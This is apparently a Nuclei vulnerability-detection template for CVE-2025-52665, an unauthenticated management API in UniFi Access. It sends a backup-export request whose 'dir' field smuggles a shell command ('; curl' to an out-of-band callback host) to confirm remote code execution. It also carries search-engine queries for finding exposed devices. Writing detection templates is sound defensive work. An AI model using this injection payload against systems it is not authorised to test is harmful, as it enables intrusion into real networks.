flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_any(body, "UniFi OS","UniFi Dream Machine SE")
    internal: true
    type: dsl
  max-redirects: 2
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - '@Host: {{Hostname}}:9780

    POST /api/ucore/backup/export HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {

    "dir":"/tmp/{{rand_string}}-; curl http://{{interactsh-url}}/; #"

    }

    '
id: CVE-2025-52665
info:
  author: theamanrawat,DhiyaneshDK
  classification:
    cve-id: CVE-2025-52665
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-306
    epss-percentile: 0.94081
    epss-score: 0.1392
  description: 'UniFi Access Application 3.3.22 through 3.4.31 contains a broken authentication
    caused by misconfiguration exposing management API without proper authentication,
    letting attackers on management network access management functions, exploit requires
    network access.

    '
  impact: 'Attackers on the management network can access management APIs without
    authentication, potentially leading to unauthorized control of the system.

    '
  metadata:
    fofa-query: body="UniFi OS"
    max-request: 2
    shodan-query: http.html:"UniFi OS"
    verified: false
  name: UniFi Access - Broken Access Control
  reference:
  - https://community.ui.com/releases/Security-Advisory-Bulletin-056-056/ce97352d-91cd-40a7-a2f4-2c73b3b30191
  - https://www.catchify.sa/post/cve-2025-52665-rce-in-unifi-os-25-000
  - https://nvd.nist.gov/vuln/detail/CVE-2025-52665
  remediation: 'Update to version 4.0.21 or later.

    '
  severity: critical
  tags: cve,cve2025,unifi,rce,vuln
variables:
  rand_string: '{{to_lower(rand_text_alpha(6))}}'
